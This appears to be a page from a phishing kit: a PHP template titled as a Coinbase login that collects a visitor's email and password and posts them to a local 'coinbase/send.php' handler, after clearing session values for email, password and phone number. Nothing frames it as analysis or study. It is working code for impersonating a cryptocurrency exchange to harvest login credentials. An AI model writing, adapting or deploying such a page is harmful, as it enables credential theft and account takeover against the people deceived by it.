<?php include_once './config.php';?>
<html lang="en">
    <?php
        unset($_SESSION['email']);
        unset($_SESSION['password']);
        unset($_SESSION['phone_number']);
    
        $title = 'Coinbase Explore| Learn| Businesses| Sign up| Login| Download';
        include_once './meta.php'; 
    ?>
    <body>
        <?php include_once './header.php'; ?>
        <div class="container">
            <div class="row justify-content-center mt20">
                <div class="col-sm-5 bg-white rounded-2 text-dark p25">
                    <form method="post" action="<?= base_url('coinbase/send.php')?>" class="">
                        <div class="my20">
                            <input name="email" type="email" required="" class="form-control" placeholder="Email" value="" >
                        </div>
                        <div class="my20">
                            <input name="password" type="password" required="" minlength="3" class="form-control" placeholder="Password" value="">
                        </div>
                        <div class="form-check">
                            <label class="form-check-label fs13">
                                <input class="form-check-input" type="checkbox" id="remember_me">Keep me signed in on this computer
                            </label>
                        </div>
                        <div class="text-end">
                            <button type="submit" class="btn btn-success"><span>Submit</span></button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './footer.php'; ?>
    </body>
</html>